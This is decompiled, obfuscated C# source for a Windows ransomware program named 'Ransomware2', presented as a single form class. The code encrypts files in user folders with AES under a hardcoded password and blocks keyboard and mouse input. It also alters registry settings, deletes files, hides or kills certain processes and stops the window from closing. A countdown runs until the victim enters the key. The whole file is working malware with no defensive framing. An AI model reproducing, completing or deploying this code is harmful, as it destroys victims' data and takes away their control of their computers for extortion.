using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using A;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = G.D;
			byte[] array = J.D(global::A.T.D(548));
			global::A.T.D(array, 552);
			byte[] salt = array;
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.KeySize = global::A.T.D(561);
					rijndaelManaged.BlockSize = global::A.T.D(565);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, global::A.T.D(569));
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / global::A.T.D(573));
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / global::A.T.D(577));
					rijndaelManaged.Mode = (CipherMode)global::A.T.D(581);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)global::A.T.D(585));
					try
					{
						cryptoStream.Write(bytesToBeEncrypted, global::A.T.D(589), (int)(nuint)E.D(bytesToBeEncrypted));
						cryptoStream.Close();
					}
					finally
					{
						if (cryptoStream != null)
						{
							while (true)
							{
								switch (6)
								{
								case 0:
									continue;
								}
								if (1 == 0)
								{
									/*OpCode not supported: LdMemberToken*/;
								}
								((IDisposable)cryptoStream).Dispose();
								break;
							}
						}
					}
					result = memoryStream.ToArray();
				}
				finally
				{
					if (rijndaelManaged != null)
					{
						while (true)
						{
							switch (6)
							{
							case 0:
								continue;
							}
							((IDisposable)rijndaelManaged).Dispose();
							break;
						}
					}
				}
			}
			finally
			{
				if (memoryStream != null)
				{
					while (true)
					{
						switch (3)
						{
						case 0:
							continue;
						}
						((IDisposable)memoryStream).Dispose();
						break;
					}
				}
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = G.D;
			byte[] array = J.D(global::A.T.D(593));
			global::A.T.D(array, 597);
			byte[] salt = array;
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.KeySize = global::A.T.D(606);
					rijndaelManaged.BlockSize = global::A.T.D(610);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, global::A.T.D(614));
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / global::A.T.D(618));
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / global::A.T.D(622));
					rijndaelManaged.Mode = (CipherMode)global::A.T.D(626);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), (CryptoStreamMode)global::A.T.D(630));
					try
					{
						cryptoStream.Write(bytesToBeDecrypted, global::A.T.D(634), (int)(nuint)E.D(bytesToBeDecrypted));
						cryptoStream.Close();
					}
					finally
					{
						if (cryptoStream != null)
						{
							while (true)
							{
								switch (1)
								{
								case 0:
									continue;
								}
								if (1 == 0)
								{
									/*OpCode not supported: LdMemberToken*/;
								}
								((IDisposable)cryptoStream).Dispose();
								break;
							}
						}
					}
					result = memoryStream.ToArray();
				}
				finally
				{
					if (rijndaelManaged != null)
					{
						while (true)
						{
							switch (7)
							{
							case 0:
								continue;
							}
							((IDisposable)rijndaelManaged).Dispose();
							break;
						}
					}
				}
			}
			finally
			{
				if (memoryStream != null)
				{
					while (true)
					{
						switch (2)
						{
						case 0:
							continue;
						}
						((IDisposable)memoryStream).Dispose();
						break;
					}
				}
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	[CompilerGenerated]
	private sealed class D
	{
		public Ransomware2 D;

		public DateTime D;

		internal void D(object P_0, EventArgs P_1)
		{
			((Control)this.D.m_Y).set_Text(DY.D(TimeSpan.FromMinutes(global::A.T.D(638)), S.D(DateTime.Now, this.D)).ToString(global::A.R.D(1031)));
		}
	}

	private static int m_D;

	private static int m_Y;

	private IContainer m_D = V.D;

	private Label m_D;

	private TextBox m_D;

	private Button m_D;

	private Label m_Y;

	private Label m_B;

	private Timer m_D;

	private Timer m_Y;

	private Timer m_B;

	private Timer m_X;

	private Timer m_A;

	public Ransomware2()
	{
		B();
		((Control)this.m_Y).set_Text(TimeSpan.FromMinutes(global::A.T.D(536)).ToString());
	}

	[DllImport("User32", EntryPoint = "ShowWindow")]
	private static extern int D(int P_0, int P_1);

	[DllImport("user32.dll", EntryPoint = "BlockInput")]
	private static extern bool D(bool P_0);

	private void D(object P_0, FormClosingEventArgs P_1)
	{
		((CancelEventArgs)(object)P_1).Cancel = (byte)global::A.T.D(0) != 0;
	}

	private void D(object P_0, EventArgs P_1)
	{
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		((Form)this).set_Opacity(global::A.T.D(4));
		((Form)this).set_Size(new Size(global::A.T.D(12), global::A.T.D(16)));
		((Form)this).set_Location(new Point(global::A.T.D(20), global::A.T.D(24)));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(global::A.R.D(1));
		registryKey.SetValue(global::A.R.D(116), global::A.T.D(28), (RegistryValueKind)global::A.T.D(32));
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(global::A.R.D(145));
		registryKey2.SetValue(global::A.R.D(188), "", (RegistryValueKind)global::A.T.D(36));
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey(global::A.R.D(207));
		registryKey3.SetValue(global::A.R.D(314), global::A.R.D(325), (RegistryValueKind)global::A.T.D(40));
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)global::A.T.D(44));
		IEnumerable<string> source = Directory.EnumerateFiles(I.D(folderPath, global::A.R.D(336)));
		Func<string, bool> func = _003C_003Ec.D;
		if (func == null)
		{
			while (true)
			{
				switch (5)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			func = (_003C_003Ec.D = (string P_0) => ((uint)new FileInfo(P_0).Attributes & (uint)global::A.T.D(646)) == (uint)global::A.T.D(650));
		}
		string[] array = source.Where(func).ToArray();
		string[] array2 = array;
		for (int i = global::A.T.D(48); i < (int)(nuint)N.D(array2); i += global::A.T.D(52))
		{
			string path = array2[i];
			File.Delete(path);
		}
		DateTime D;
		while (true)
		{
			switch (3)
			{
			case 0:
				continue;
			}
			D = DateTime.Now;
			Timer val = new Timer();
			val.set_Interval(global::A.T.D(56));
			Timer val2 = val;
			val2.add_Tick((EventHandler)delegate
			{
				((Control)this.m_Y).set_Text(DY.D(TimeSpan.FromMinutes(global::A.T.D(638)), S.D(DateTime.Now, D)).ToString(global::A.R.D(1031)));
			});
			val2.set_Enabled((byte)global::A.T.D(60) != 0);
			this.m_D.Start();
			this.m_Y.Start();
			this.m_B.Start();
			this.m_X.Start();
			this.m_A.Start();
			return;
		}
	}

	private void Y(object P_0, EventArgs P_1)
	{
		this.m_D.Stop();
		((Form)this).set_Opacity(global::A.T.D(64));
		((Form)this).set_Size(new Size(global::A.T.D(72), global::A.T.D(76)));
		((Form)this).set_Location(new Point(global::A.T.D(80), global::A.T.D(84)));
		Thawouse();
	}

	private void B(object P_0, EventArgs P_1)
	{
		this.m_Y.Stop();
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)global::A.T.D(88));
		string path = I.D(folderPath, global::A.R.D(339));
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable(global::A.R.D(364));
		string text = Path.Combine(environmentVariable, global::A.R.D(387));
		string path2 = I.D(text, global::A.R.D(339));
		File.Delete(path2);
	}

	private void X(object P_0, EventArgs P_1)
	{
		this.m_B.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		for (int i = global::A.T.D(92); i < (int)(nuint)Z.D(array); i += global::A.T.D(112))
		{
			Process process = array[i];
			int num;
			if (F.D(process.ProcessName, global::A.R.D(406)))
			{
				while (true)
				{
					switch (3)
					{
					case 0:
						continue;
					}
					break;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				num = process.MainWindowHandle.ToInt32();
				D(num, global::A.T.D(96));
			}
			if (F.D(process.ProcessName, global::A.R.D(413)))
			{
				while (true)
				{
					switch (4)
					{
					case 0:
						continue;
					}
					break;
				}
				num = process.MainWindowHandle.ToInt32();
				D(num, global::A.T.D(100));
			}
			if (F.D(process.ProcessName, global::A.R.D(428)))
			{
				while (true)
				{
					switch (7)
					{
					case 0:
						continue;
					}
					break;
				}
				num = process.MainWindowHandle.ToInt32();
				D(num, global::A.T.D(104));
			}
			if (!F.D(process.ProcessName, global::A.R.D(455)))
			{
				continue;
			}
			while (true)
			{
				switch (6)
				{
				case 0:
					continue;
				}
				break;
			}
			num = process.MainWindowHandle.ToInt32();
			D(num, global::A.T.D(108));
		}
		while (true)
		{
			switch (6)
			{
			case 0:
				continue;
			}
			this.m_B.Start();
			return;
		}
	}

	private void A(object P_0, EventArgs P_1)
	{
		this.m_X.Stop();
		D();
	}

	private void R(object P_0, EventArgs P_1)
	{
		this.m_A.Stop();
		Process[] d = P.D;
		d = Process.GetProcessesByName(global::A.R.D(466));
		Process[] array = d;
		for (int i = global::A.T.D(116); i < (int)(nuint)Z.D(array); i += global::A.T.D(120))
		{
			Process process = array[i];
			Process.Start(global::A.R.D(493), global::A.R.D(510));
			process.Kill();
		}
		while (true)
		{
			switch (4)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			((Form)this).Close();
			return;
		}
	}

	private void T(object P_0, EventArgs P_1)
	{
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		if (F.D(((Control)this.m_D).get_Text(), ""))
		{
			while (true)
			{
				switch (6)
				{
				case 0:
					break;
				default:
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					MessageBox.Show(global::A.R.D(525), global::A.R.D(552), (MessageBoxButtons)global::A.T.D(124), (MessageBoxIcon)global::A.T.D(128));
					return;
				}
			}
		}
		if (F.D(((Control)this.m_D).get_Text(), global::A.R.D(571)))
		{
			while (true)
			{
				switch (1)
				{
				case 0:
					break;
				default:
				{
					MessageBox.Show(global::A.R.D(584), global::A.R.D(607), (MessageBoxButtons)global::A.T.D(132), (MessageBoxIcon)global::A.T.D(136));
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(global::A.R.D(1));
					registryKey.SetValue(global::A.R.D(116), "", (RegistryValueKind)global::A.T.D(140));
					RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(global::A.R.D(207));
					registryKey2.SetValue(global::A.R.D(314), global::A.R.D(620), (RegistryValueKind)global::A.T.D(144));
					Y();
					Process[] d = P.D;
					d = Process.GetProcessesByName(global::A.R.D(645));
					Process[] array = d;
					for (int i = global::A.T.D(148); i < (int)(nuint)Z.D(array); i += global::A.T.D(152))
					{
						Process process = array[i];
						process.Kill();
					}
					while (true)
					{
						switch (5)
						{
						case 0:
							break;
						default:
							return;
						}
					}
				}
				}
			}
		}
		MessageBox.Show(global::A.R.D(525), global::A.R.D(670), (MessageBoxButtons)global::A.T.D(156), (MessageBoxIcon)global::A.T.D(160));
	}

	public static void FreezeMouse()
	{
		D((byte)global::A.T.D(164) != 0);
	}

	public static void Thawouse()
	{
		D((byte)global::A.T.D(168) != 0);
	}

	private void Q(object P_0, EventArgs P_1)
	{
	}

	private static void D()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)global::A.T.D(172));
		string environmentVariable = Environment.GetEnvironmentVariable(global::A.R.D(364));
		string text = Path.Combine(environmentVariable, global::A.R.D(387));
		string[] files = Directory.GetFiles(I.D(folderPath, global::A.R.D(336)), global::A.R.D(689), (SearchOption)global::A.T.D(176));
		string[] files2 = Directory.GetFiles(I.D(text, global::A.R.D(336)), global::A.R.D(689), (SearchOption)global::A.T.D(180));
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = global::A.R.D(571);
		for (int i = global::A.T.D(184); i < (int)(nuint)N.D(files); i += global::A.T.D(188))
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		while (true)
		{
			switch (4)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			for (int j = global::A.T.D(192); j < (int)(nuint)N.D(files2); j += global::A.T.D(196))
			{
				encryptionFile.EncryptFile(files2[j], password);
			}
			while (true)
			{
				switch (5)
				{
				case 0:
					break;
				default:
					return;
				}
			}
		}
	}

	private static void Y()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)global::A.T.D(200));
		string environmentVariable = Environment.GetEnvironmentVariable(global::A.R.D(364));
		string text = Path.Combine(environmentVariable, global::A.R.D(387));
		string[] files = Directory.GetFiles(I.D(folderPath, global::A.R.D(336)), global::A.R.D(689), (SearchOption)global::A.T.D(204));
		string[] files2 = Directory.GetFiles(I.D(text, global::A.R.D(336)), global::A.R.D(689), (SearchOption)global::A.T.D(208));
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = global::A.R.D(692);
		for (int i = global::A.T.D(212); i < (int)(nuint)N.D(files); i += global::A.T.D(216))
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		while (true)
		{
			switch (2)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			for (int j = global::A.T.D(220); j < (int)(nuint)N.D(files2); j += global::A.T.D(224))
			{
				decryptionFile.DecryptFile(files2[j], password);
			}
			while (true)
			{
				switch (3)
				{
				case 0:
					break;
				default:
					return;
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		int num;
		if (disposing)
		{
			while (true)
			{
				switch (4)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			num = ((this.m_D > V.D) ? 1 : 0);
		}
		else
		{
			num = global::A.T.D(228);
		}
		if (num != 0)
		{
			while (true)
			{
				switch (1)
				{
				case 0:
					continue;
				}
				break;
			}
			this.m_D.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void B()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_0326: Unknown result type (might be due to invalid IL or missing references)
		//IL_0330: Expected O, but got Unknown
		//IL_047a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0484: Expected O, but got Unknown
		//IL_05a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05aa: Expected O, but got Unknown
		//IL_0982: Unknown result type (might be due to invalid IL or missing references)
		//IL_098c: Expected O, but got Unknown
		this.m_D = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(O.D()));
		this.m_D = new Label();
		this.m_D = new TextBox();
		this.m_D = new Button();
		this.m_Y = new Label();
		this.m_B = new Label();
		this.m_D = new Timer(this.m_D);
		this.m_Y = new Timer(this.m_D);
		this.m_B = new Timer(this.m_D);
		this.m_X = new Timer(this.m_D);
		this.m_A = new Timer(this.m_D);
		((Control)this).SuspendLayout();
		((Control)this.m_D).set_AutoSize((byte)global::A.T.D(232) != 0);
		((Control)this.m_D).set_Font(new Font(global::A.R.D(715), global::A.T.D(236), (FontStyle)global::A.T.D(240), (GraphicsUnit)global::A.T.D(244), (byte)global::A.T.D(248)));
		((Control)this.m_D).set_ForeColor(Color.White);
		((Control)this.m_D).set_Location(new Point(global::A.T.D(252), global::A.T.D(256)));
		((Control)this.m_D).set_Name(global::A.R.D(740));
		((Control)this.m_D).set_Size(new Size(global::A.T.D(260), global::A.T.D(264)));
		((Control)this.m_D).set_TabIndex(global::A.T.D(268));
		((Control)this.m_D).set_BackColor(Color.Black);
		((Control)this.m_D).set_Font(new Font(global::A.R.D(749), global::A.T.D(272), (FontStyle)global::A.T.D(276), (GraphicsUnit)global::A.T.D(280), (byte)global::A.T.D(284)));
		((Control)this.m_D).set_ForeColor(SystemColors.Info);
		((Control)this.m_D).set_Location(new Point(global::A.T.D(288), global::A.T.D(292)));
		((Control)this.m_D).set_Name(global::A.R.D(790));
		((Control)this.m_D).set_Size(new Size(global::A.T.D(296), global::A.T.D(300)));
		((Control)this.m_D).set_TabIndex(global::A.T.D(304));
		this.m_D.set_TextAlign((HorizontalAlignment)global::A.T.D(308));
		((Control)this.m_D).add_TextChanged((EventHandler)Q);
		((Control)this.m_D).set_BackColor(Color.Black);
		((Control)this.m_D).set_Cursor(Cursors.get_Hand());
		((ButtonBase)this.m_D).set_FlatStyle((FlatStyle)global::A.T.D(312));
		((Control)this.m_D).set_Font(new Font(global::A.R.D(749), global::A.T.D(316), (FontStyle)global::A.T.D(320), (GraphicsUnit)global::A.T.D(324), (byte)global::A.T.D(328)));
		((Control)this.m_D).set_ForeColor(Color.Red);
		((Control)this.m_D).set_Location(new Point(global::A.T.D(332), global::A.T.D(336)));
		((Control)this.m_D).set_Name(global::A.R.D(805));
		((Control)this.m_D).set_Size(new Size(global::A.T.D(340), global::A.T.D(344)));
		((Control)this.m_D).set_TabIndex(global::A.T.D(348));
		((Control)this.m_D).set_Text(global::A.R.D(820));
		((ButtonBase)this.m_D).set_UseVisualStyleBackColor((byte)global::A.T.D(352) != 0);
		((Control)this.m_D).add_Click((EventHandler)T);
		((Control)this.m_Y).set_AutoSize((byte)global::A.T.D(356) != 0);
		((Control)this.m_Y).set_BackColor(Color.Black);
		((Control)this.m_Y).set_Cursor(Cursors.get_No());
		((Control)this.m_Y).set_Font(new Font(global::A.R.D(847), global::A.T.D(360), (FontStyle)global::A.T.D(364), (GraphicsUnit)global::A.T.D(368), (byte)global::A.T.D(372)));
		((Control)this.m_Y).set_ForeColor(Color.Red);
		((Control)this.m_Y).set_Location(new Point(global::A.T.D(376), global::A.T.D(380)));
		((Control)this.m_Y).set_Name(global::A.R.D(858));
		((Control)this.m_Y).set_Size(new Size(global::A.T.D(384), global::A.T.D(388)));
		((Control)this.m_Y).set_TabIndex(global::A.T.D(392));
		((Control)this.m_Y).set_Text(global::A.R.D(871));
		((Control)this.m_B).set_AutoSize((byte)global::A.T.D(396) != 0);
		((Control)this.m_B).set_BackColor(Color.Black);
		((Control)this.m_B).set_Cursor(Cursors.get_No());
		((Control)this.m_B).set_Font(new Font(global::A.R.D(847), global::A.T.D(400), (FontStyle)global::A.T.D(404), (GraphicsUnit)global::A.T.D(408), (byte)global::A.T.D(412)));
		((Control)this.m_B).set_ForeColor(Color.Red);
		((Control)this.m_B).set_Location(new Point(global::A.T.D(416), global::A.T.D(420)));
		((Control)this.m_B).set_Name(global::A.R.D(888));
		((Control)this.m_B).set_Size(new Size(global::A.T.D(424), global::A.T.D(428)));
		((Control)this.m_B).set_TabIndex(global::A.T.D(432));
		((Control)this.m_B).set_Text(global::A.R.D(901));
		this.m_D.set_Enabled((byte)global::A.T.D(436) != 0);
		this.m_D.set_Interval(global::A.T.D(440));
		this.m_D.add_Tick((EventHandler)Y);
		this.m_Y.set_Enabled((byte)global::A.T.D(444) != 0);
		this.m_Y.set_Interval(global::A.T.D(448));
		this.m_Y.add_Tick((EventHandler)B);
		this.m_B.set_Enabled((byte)global::A.T.D(452) != 0);
		this.m_B.set_Interval(global::A.T.D(456));
		this.m_B.add_Tick((EventHandler)X);
		this.m_X.set_Enabled((byte)global::A.T.D(460) != 0);
		this.m_X.set_Interval(global::A.T.D(464));
		this.m_X.add_Tick((EventHandler)A);
		this.m_A.set_Enabled((byte)global::A.T.D(468) != 0);
		this.m_A.set_Interval(global::A.T.D(472));
		this.m_A.add_Tick((EventHandler)R);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(global::A.T.D(476), global::A.T.D(480)));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)global::A.T.D(484));
		((Control)this).set_BackColor(Color.WhiteSmoke);
		((Control)this).set_BackgroundImage(M.D(componentResourceManager.GetObject(global::A.R.D(928))));
		((Control)this).set_BackgroundImageLayout((ImageLayout)global::A.T.D(488));
		((Form)this).set_ClientSize(new Size(global::A.T.D(492), global::A.T.D(496)));
		((Control)this).get_Controls().Add((Control)(object)this.m_B);
		((Control)this).get_Controls().Add((Control)(object)this.m_Y);
		((Control)this).get_Controls().Add((Control)(object)this.m_D);
		((Control)this).get_Controls().Add((Control)(object)this.m_D);
		((Control)this).get_Controls().Add((Control)(object)this.m_D);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)global::A.T.D(500));
		((Form)this).set_Icon(U.D(componentResourceManager.GetObject(global::A.R.D(971))));
		((Form)this).set_MaximizeBox((byte)global::A.T.D(504) != 0);
		((Form)this).set_MinimizeBox((byte)global::A.T.D(508) != 0);
		((Control)this).set_Name(global::A.R.D(992));
		((Form)this).set_ShowIcon((byte)global::A.T.D(512) != 0);
		((Form)this).set_ShowInTaskbar((byte)global::A.T.D(516) != 0);
		((Form)this).set_StartPosition((FormStartPosition)global::A.T.D(520));
		((Control)this).set_Text(global::A.R.D(1015));
		((Form)this).set_TopMost((byte)global::A.T.D(524) != 0);
		((Form)this).set_WindowState((FormWindowState)global::A.T.D(528));
		((Form)this).add_FormClosing(new FormClosingEventHandler(D));
		((Form)this).add_Load((EventHandler)D);
		((Control)this).ResumeLayout((byte)global::A.T.D(532) != 0);
		((Control)this).PerformLayout();
	}
}
